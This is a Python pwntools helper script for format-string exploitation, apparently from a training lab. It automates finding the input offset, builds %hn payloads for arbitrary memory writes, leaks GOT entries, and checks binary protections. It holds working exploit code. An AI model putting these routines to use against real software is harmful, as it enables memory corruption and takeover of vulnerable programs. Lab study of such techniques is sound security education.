#!/usr/bin/env python3
"""
Format String Exploit Helpers
Common utility functions for all levels.
"""

import os
import struct
from pwn import *

# If run from lab/ dir, helpers work on binaries in subdirs
HERE = os.path.dirname(os.path.abspath(__file__))

context.log_level = 'info'
context.bits = 32

def find_offset(binary_path, marker=b'AAAA', max_offset=25):
    """Automatically find format string offset for user input."""
    p = process(binary_path)
    prompt = p.recvuntil(b'input', timeout=2) or p.recvuntil(b'payload', timeout=2) or p.recvuntil(b'> ', timeout=2)

    # Send marker + positional %p for each position
    for off in range(1, max_offset + 1):
        p2 = process(binary_path)
        try:
            p2.recvuntil(b'input', timeout=1)
        except:
            try:
                p2.recvuntil(b'payload', timeout=1)
            except:
                p2.recvuntil(b'> ', timeout=1)

        payload = marker + f'%{off}$p'.encode()
        p2.sendline(payload)
        try:
            output = p2.recvall(timeout=1)
        except:
            output = b''
        p2.close()

        marker_hex = marker.hex().upper().encode()
        if marker_hex in output or b'41414141' in output.upper():
            log.success(f"Offset found: {off}")
            return off

    log.warning(f"Offset not found in range 1-{max_offset}")
    return None

def fmtstr_payload(offset, writes, written=0):
    """
    Generate format string payload for arbitrary writes.
    
    writes: dict of {address: value}
    offset: format string offset to start of payload
    written: bytes already printed before format specifiers
    
    Returns: (payload_bytes, addresses_bytes) 
    """
    # Sort by value (low to high) for %hn / %hhn writes
    addrs = sorted(writes.keys())
    values = [writes[a] for a in addrs]
    
    # Build address portion
    addr_bytes = b''
    for a in addrs:
        addr_bytes += p32(a)
    
    # Build format specifiers
    fmt = b''
    current = written + len(addr_bytes)
    
    for i, (addr, val) in enumerate(zip(addrs, values)):
        if val < current:
            val += 0x10000  # wraparound
        
        fmt += f'%{val - current}x'.encode()
        fmt += f'%{offset + i}$hn'.encode()
        current = val
    
    return addr_bytes + fmt

def checksec(binary_path):
    """Check binary protections."""
    elf = ELF(binary_path)
    log.info(f"Binary: {binary_path}")
    log.info(f"Arch: {elf.arch}")
    log.info(f"PIE: {elf.pie}")
    log.info(f"RELRO: {elf.relro}")
    log.info(f"Stack Canary: {elf.canary}")
    log.info(f"NX: {elf.nx}")
    return elf

def leak_got(binary_path, offset, got_entry):
    """Leak a GOT entry via format string arbitrary read."""
    elf = ELF(binary_path)
    got_addr = elf.got[got_entry]
    log.info(f"{got_entry}@GOT: {hex(got_addr)}")
    
    p = process(binary_path)
    p.recvuntil(b'input')
    
    payload = p32(got_addr) + f'%{offset}$s'.encode()
    p.sendline(payload)
    
    try:
        output = p.recvall(timeout=2)
    except:
        p.close()
        return None
    
    p.close()
    return output

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        binary = sys.argv[1]
        offset = find_offset(binary)
        print(f"Offset: {offset}")
        elf = checksec(binary)
